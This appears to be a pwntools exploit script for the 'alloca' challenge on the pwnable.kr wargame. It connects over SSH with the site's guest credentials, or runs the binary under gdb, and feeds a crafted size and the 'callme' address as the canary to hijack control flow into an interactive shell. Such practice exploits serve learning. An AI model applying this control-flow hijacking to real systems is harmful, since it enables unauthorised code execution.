from pwn import *
import argh


context.log_level = 'info'

host = 'pwnable.kr'
user = 'alloca'
port = 2222
password = 'guest'


script = '''
b* 0x08048769
display/16wx $esp
layout regs
continue
'''


def communicate(p, size, canary, payload='aaaa'):
    p.recvuntil('here is how to.\n\n')
    sleep(1)
    p.recvuntil('let me show you.\n\n')
    sleep(1)
    p.sendline(str(size))
    p.sendline(str(canary))
    p.recvuntil('\n\n')
    sleep(1)
    p.sendline(payload)


def start_gdb(exe_name):
    return gdb.debug([exe_name], script)


@argh.arg('alloca', type=int, help='Run Remotly')
@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(alloca, local=False, runpwn=False):
    p = None
    bin_path = './alloca'
    e = ELF(bin_path)
    argv = [bin_path]

    if local:
        p = start_gdb(bin_path)
        # p = process(argv=argv)
        # sleep(0.5)
        # gdb.attach(p, script)
    elif runpwn:
        s = ssh(user, host, port, password)
        p = s.process(argv=argv)

    communicate(p, alloca, e.symbols.callme)

    p.interactive()


if __name__ == '__main__':
    argh.dispatch_command(main)

